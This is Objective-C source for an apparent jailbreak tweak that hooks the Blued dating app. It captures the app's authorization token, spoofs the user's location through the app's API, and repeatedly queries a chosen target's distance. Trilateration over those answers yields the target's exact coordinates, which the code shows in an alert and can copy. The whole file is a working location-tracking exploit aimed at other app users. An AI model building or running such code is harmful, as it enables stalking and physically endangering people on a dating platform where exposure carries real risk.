#import <substrate.h>
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <CoreLocation/CoreLocation.h>
#import <math.h>
#import <objc/runtime.h>

#define TRACK_BTN_TAG 100001
#define MAX_RECURSIVE_ATTEMPTS 12
#define LOCK_THRESHOLD 0.01
#define EARTH_RADIUS_KM 111.32

// 全局变量
static NSString *g_bluedBasicToken = nil;
static NSString *g_currentTargetUid = nil;
static double g_initialDistance = -1.0;
static double g_myRealLat = 0.0;
static double g_myRealLng = 0.0;
static BOOL g_hasLocationRecord = NO;

// ====================== 前置声明（解决编译顺序问题）======================
@interface UIWindow (TrackHookPrivate)
- (void)trackHook_addFloatingButton;
- (void)trackHook_onButtonClick:(UIButton *)sender;
@end

// 工具函数前置声明
static UIWindow * GetCurrentMainWindow(void);
static void ShowToast(NSString *message, NSTimeInterval duration);
static void ShowResult(BOOL success, NSString *message, double lat, double lng);
static void UpdateMyServerLocation(NSString *token, double lat, double lng);
static double FetchDynamicDistance(NSString *uid, NSString *token, double fakeLat, double fakeLng);
static NSArray * CalculateIntersections(double lat1, double lng1, double r1, double lat2, double lng2, double r2);
static void RunRecursiveTrilateration(NSString *uid, NSString *token, double startLat, double startLng, double startDist);

// ====================== CLLocationManager Hook（自动记录坐标）======================
%hook CLLocationManager

- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
    %orig;
    
    if (locations.count > 0) {
        CLLocation *latest = locations.lastObject;
        g_myRealLat = latest.coordinate.latitude;
        g_myRealLng = latest.coordinate.longitude;
        g_hasLocationRecord = YES;
        
        NSLog(@"[TrackHook] 记录坐标: %.8f, %.8f", g_myRealLat, g_myRealLng);
        
        NSUserDefaults *defs = [NSUserDefaults standardUserDefaults];
        [defs setDouble:g_myRealLat forKey:@"trackhook_last_lat"];
        [defs setDouble:g_myRealLng forKey:@"trackhook_last_lng"];
        [defs synchronize];
    }
}

- (void)locationManager:(CLLocationManager *)manager didUpdateToLocation:(CLLocation *)newLocation fromLocation:(CLLocation *)oldLocation {
    %orig;
    if (newLocation) {
        g_myRealLat = newLocation.coordinate.latitude;
        g_myRealLng = newLocation.coordinate.longitude;
        g_hasLocationRecord = YES;
    }
}

%end

// ====================== NSURLSession Hook（抓取 Token）======================
%hook NSURLSession
- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData *, NSURLResponse *, NSError *))completionHandler {
    NSDictionary *headers = request.allHTTPHeaderFields;
    NSString *auth = headers[@"authorization"] ?: headers[@"Authorization"];
    if (auth && [auth hasPrefix:@"Basic "]) {
        NSString *token = [auth substringFromIndex:6];
        if (token.length > 0 && ![g_bluedBasicToken isEqualToString:token]) {
            g_bluedBasicToken = token;
            NSLog(@"[TrackHook] 抓取 Token: %@", token);
        }
    }
    return %orig(request, completionHandler);
}
%end

// ====================== UIWindow Hook（悬浮按钮）======================
%hook UIWindow

%new
- (UIViewController *)trackHook_topViewController {
    UIViewController *top = self.rootViewController;
    while (top.presentedViewController) {
        top = top.presentedViewController;
    }
    if ([top isKindOfClass:[UINavigationController class]]) {
        top = ((UINavigationController *)top).topViewController;
    } else if ([top isKindOfClass:[UITabBarController class]]) {
        top = ((UITabBarController *)top).selectedViewController;
        if ([top isKindOfClass:[UINavigationController class]]) {
            top = ((UINavigationController *)top).topViewController;
        }
    }
    return top;
}

%new
- (void)trackHook_addFloatingButton {
    if ([self viewWithTag:TRACK_BTN_TAG]) return;
    
    UIButton *btn = [UIButton buttonWithType:UIButtonTypeCustom];
    btn.tag = TRACK_BTN_TAG;
    [btn setTitle:@"🛰️ 定位" forState:UIControlStateNormal];
    btn.titleLabel.font = [UIFont boldSystemFontOfSize:12];
    [btn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    btn.backgroundColor = [UIColor colorWithRed:0.91 green:0.12 blue:0.39 alpha:1.0];
    btn.layer.cornerRadius = 20;
    btn.layer.borderWidth = 2;
    btn.layer.borderColor = [UIColor whiteColor].CGColor;
    btn.clipsToBounds = YES;
    
    CGFloat top = 100;
    if (@available(iOS 11.0, *)) top = self.safeAreaInsets.top + 60;
    
    btn.frame = CGRectMake(self.bounds.size.width - 110, top, 90, 40);
    btn.autoresizingMask = UIViewAutoresizingFlexibleLeftMargin;
    
    [btn addTarget:self action:@selector(trackHook_onButtonClick:) forControlEvents:UIControlEventTouchUpInside];
    
    [self addSubview:btn];
    NSLog(@"[TrackHook] 按钮已添加");
}

%new
- (void)trackHook_onButtonClick:(UIButton *)sender {
    UIViewController *topVC = [self trackHook_topViewController];
    if (!topVC) {
        ShowToast(@"无法获取当前页面", 2.0);
        return;
    }
    
    // 提取用户信息
    g_currentTargetUid = nil;
    g_initialDistance = -1.0;
    
    NSArray *keys = @[@"user", @"userInfo", @"userModel", @"viewModel", @"model", @"data"];
    for (NSString *key in keys) {
        @try {
            id obj = [topVC valueForKey:key];
            if (!obj) continue;
            
            NSString *uid = [obj valueForKey:@"uid"] ?: [obj valueForKey:@"userId"] ?: [obj valueForKey:@"user_id"];
            if (uid) g_currentTargetUid = uid;
            
            id dist = [obj valueForKey:@"distance"];
            if (dist) {
                if ([dist isKindOfClass:[NSNumber class]]) {
                    g_initialDistance = [dist doubleValue];
                } else if ([dist isKindOfClass:[NSString class]]) {
                    NSString *clean = [(NSString *)dist stringByTrimmingCharactersInSet:[[NSCharacterSet characterSetWithCharactersInString:@"0123456789."] invertedSet]];
                    g_initialDistance = [clean doubleValue];
                }
            }
            
            if (g_currentTargetUid && g_initialDistance > 0) break;
        } @catch (NSException *e) {}
    }
    
    // 校验
    if (!g_currentTargetUid) {
        ShowToast(@"❌ 请先打开目标用户主页", 3.0);
        return;
    }
    if (g_initialDistance < 0) {
        ShowToast(@"❌ 无法获取距离信息", 3.0);
        return;
    }
    if (g_initialDistance >= 9999.0 || g_initialDistance <= 0.0) {
        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"⚠️ 追踪中止" message:@"目标开启了隐身或距离无效" preferredStyle:UIAlertControllerStyleAlert];
        [alert addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleDefault handler:nil]];
        [topVC presentViewController:alert animated:YES completion:nil];
        return;
    }
    if (!g_bluedBasicToken) {
        ShowToast(@"❌ Token 为空，请先刷新附近列表", 3.0);
        return;
    }
    
    // 获取坐标
    double myLat = 0, myLng = 0;
    if (g_hasLocationRecord) {
        myLat = g_myRealLat;
        myLng = g_myRealLng;
    } else {
        NSUserDefaults *defs = [NSUserDefaults standardUserDefaults];
        myLat = [defs doubleForKey:@"trackhook_last_lat"];
        myLng = [defs doubleForKey:@"trackhook_last_lng"];
    }
    
    if (myLat == 0 || myLng == 0) {
        ShowToast(@"❌ 未获取到定位坐标，请先开启定位", 4.0);
        return;
    }
    
    ShowToast([NSString stringWithFormat:@"🛰️ 启动定位\n目标距离: %.2f km", g_initialDistance], 3.0);
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        RunRecursiveTrilateration(g_currentTargetUid, g_bluedBasicToken, myLat, myLng, g_initialDistance);
    });
}

- (void)becomeKeyWindow {
    %orig;
    [self trackHook_addFloatingButton];
}

- (void)layoutSubviews {
    %orig;
    UIButton *btn = [self viewWithTag:TRACK_BTN_TAG];
    if (!btn) [self trackHook_addFloatingButton];
    else [self bringSubviewToFront:btn];
}

%end

// ====================== UIViewController Hook（页面监听）======================
%hook UIViewController

- (void)viewDidAppear:(BOOL)animated {
    %orig;
    NSString *name = NSStringFromClass([self class]);
    if ([name containsString:@"User"] || [name containsString:@"Profile"] || [name containsString:@"Detail"]) {
        UIWindow *win = [UIApplication sharedApplication].keyWindow;
        if ([win respondsToSelector:@selector(trackHook_addFloatingButton)]) {
            [win trackHook_addFloatingButton];
        }
    }
}

%end

// ====================== 静态工具函数实现 ======================

static UIWindow * GetCurrentMainWindow(void) {
    UIWindow *win = nil;
    if (@available(iOS 13.0, *)) {
        for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive) {
                win = scene.windows.firstObject;
                break;
            }
        }
    }
    if (!win) win = [UIApplication sharedApplication].keyWindow;
    if (!win) win = [UIApplication sharedApplication].windows.firstObject;
    return win;
}

static void ShowToast(NSString *message, NSTimeInterval duration) {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *win = GetCurrentMainWindow();
        if (!win) return;
        
        for (UIView *v in win.subviews) if (v.tag == 99999) [v removeFromSuperview];
        
        UILabel *toast = [[UILabel alloc] initWithFrame:CGRectMake(20, win.bounds.size.height/2 - 50, win.bounds.size.width - 40, 100)];
        toast.tag = 99999;
        toast.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
        toast.textColor = [UIColor whiteColor];
        toast.textAlignment = NSTextAlignmentCenter;
        toast.numberOfLines = 0;
        toast.font = [UIFont systemFontOfSize:14];
        toast.text = message;
        toast.layer.cornerRadius = 12;
        toast.clipsToBounds = YES;
        
        [win addSubview:toast];
        
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(duration * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [UIView animateWithDuration:0.3 animations:^{ toast.alpha = 0; } completion:^(BOOL f) { [toast removeFromSuperview]; }];
        });
    });
}

static void ShowResult(BOOL success, NSString *message, double lat, double lng) {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *win = GetCurrentMainWindow();
        if (!win) return;
        
        UIViewController *top = win.rootViewController;
        while (top.presentedViewController) top = top.presentedViewController;
        
        if (success) {
            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"🎯 雷达锁定成功" message:message preferredStyle:UIAlertControllerStyleAlert];
            [alert addAction:[UIAlertAction actionWithTitle:@"复制坐标" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a) {
                [[UIPasteboard generalPasteboard] setString:[NSString stringWithFormat:@"%.8f, %.8f", lat, lng]];
                ShowToast(@"✅ 已复制", 2.0);
            }]];
            [alert addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [top presentViewController:alert animated:YES completion:nil];
        } else {
            ShowToast(message, 3.0);
        }
    });
}

static void UpdateMyServerLocation(NSString *token, double lat, double lng) {
    NSString *url = [NSString stringWithFormat:@"https://argo.blued.cn/users?sort_by=nearby&latitude=%.8f&longitude=%.8f&limit=1", lat, lng];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
    req.HTTPMethod = @"GET";
    [req setValue:[NSString stringWithFormat:@"Basic %@", token] forHTTPHeaderField:@"authorization"];
    req.timeoutInterval = 3.0;
    
    dispatch_semaphore_t s = dispatch_semaphore_create(0);
    [[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
        dispatch_semaphore_signal(s);
    }];
    dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(4 * NSEC_PER_SEC)));
}

static double FetchDynamicDistance(NSString *uid, NSString *token, double fakeLat, double fakeLng) {
    UpdateMyServerLocation(token, fakeLat, fakeLng);
    [NSThread sleepForTimeInterval:1.0];
    
    NSString *url = [NSString stringWithFormat:@"https://argo.blued.cn/users/%@/basic", uid];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
    req.HTTPMethod = @"GET";
    [req setValue:[NSString stringWithFormat:@"Basic %@", token] forHTTPHeaderField:@"authorization"];
    req.timeoutInterval = 3.0;
    
    __block double result = -1.0;
    dispatch_semaphore_t s = dispatch_semaphore_create(0);
    [[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
        if (!e && d) {
            @try {
                NSDictionary *json = [NSJSONSerialization JSONObjectWithData:d options:0 error:nil];
                NSArray *arr = json[@"data"];
                if (arr.count > 0) {
                    if ([arr[0][@"is_hide_distance"] intValue] == 0) {
                        result = [arr[0][@"distance"] doubleValue];
                    }
                }
            } @catch (NSException *ex) {}
        }
        dispatch_semaphore_signal(s);
    }];
    dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(4 * NSEC_PER_SEC)));
    
    return result;
}

static NSArray * CalculateIntersections(double lat1, double lng1, double r1, double lat2, double lng2, double r2) {
    NSMutableArray *res = [NSMutableArray array];
    
    double x1 = 0, y1 = 0;
    double x2 = (lng2 - lng1) * EARTH_RADIUS_KM * cos(lat1 * M_PI / 180.0);
    double y2 = (lat2 - lat1) * EARTH_RADIUS_KM;
    
    double d = sqrt(x2*x2 + y2*y2);
    if (d > r1 + r2 || d < fabs(r1 - r2) || d == 0.0) return res;
    
    double a = (r1*r1 - r2*r2 + d*d) / (2*d);
    double h = sqrt(fmax(0.0, r1*r1 - a*a));
    
    double x3 = x1 + a * (x2 - x1) / d;
    double y3 = y1 + a * (y2 - y1) / d;
    
    double rx = -h * (y2 - y1) / d;
    double ry = h * (x2 - x1) / d;
    
    double latA = lat1 + (y3 + ry) / EARTH_RADIUS_KM;
    double lngA = lng1 + (x3 + rx) / (EARTH_RADIUS_KM * cos(lat1 * M_PI / 180.0));
    double latB = lat1 + (y3 - ry) / EARTH_RADIUS_KM;
    double lngB = lng1 + (x3 - rx) / (EARTH_RADIUS_KM * cos(lat1 * M_PI / 180.0));
    
    [res addObject:@[@(latA), @(lngA)]];
    [res addObject:@[@(latB), @(lngB)]];
    return res;
}

static void RunRecursiveTrilateration(NSString *uid, NSString *token, double startLat, double startLng, double startDist) {
    double curLat = startLat, curLng = startLng, curDist = startDist;
    
    for (int i = 1; i <= MAX_RECURSIVE_ATTEMPTS; i++) {
        if (curDist <= LOCK_THRESHOLD) {
            ShowResult(YES, [NSString stringWithFormat:@"🎯 极限锁定！\n纬度: %.8f\n经度: %.8f\n误差: %.4fkm", curLat, curLng, curDist], curLat, curLng);
            return;
        }
        
        dispatch_async(dispatch_get_main_queue(), ^{
            ShowToast([NSString stringWithFormat:@"第 %d 次计算...\n距离: %.2fkm", i, curDist], 2.0);
        });
        
        double offsetLat = curLat;
        double offsetLng = curLng + (curDist / (EARTH_RADIUS_KM * cos(curLat * M_PI / 180.0)));
        
        double newDist = FetchDynamicDistance(uid, token, offsetLat, offsetLng);
        if (newDist < 0) {
            ShowResult(NO, @"获取距离失败", 0, 0);
            return;
        }
        
        NSArray *inters = CalculateIntersections(curLat, curLng, curDist, offsetLat, offsetLng, newDist);
        if (inters.count < 2) {
            curLng += (curDist * 0.1) / (EARTH_RADIUS_KM * cos(curLat * M_PI / 180.0));
            continue;
        }
        
        dispatch_async(dispatch_get_main_queue(), ^{
            ShowToast(@"验证交点中...", 1.5);
        });
        
        NSArray *p1 = inters[0];
        NSArray *p2 = inters[1];
        double d1 = FetchDynamicDistance(uid, token, [p1[0] doubleValue], [p1[1] doubleValue]);
        double d2 = FetchDynamicDistance(uid, token, [p2[0] doubleValue], [p2[1] doubleValue]);
        
        if (d1 < 0 && d2 < 0) {
            ShowResult(NO, @"交点验证失败", 0, 0);
            return;
        }
        
        if (d1 >= 0 && (d2 < 0 || d1 < d2)) {
            curLat = [p1[0] doubleValue];
            curLng = [p1[1] doubleValue];
            curDist = d1;
        } else {
            curLat = [p2[0] doubleValue];
            curLng = [p2[1] doubleValue];
            curDist = d2;
        }
    }
    
    ShowResult(YES, [NSString stringWithFormat:@"计算完成\n纬度: %.8f\n经度: %.8f\n误差: %.4fkm", curLat, curLng, curDist], curLat, curLng);
}
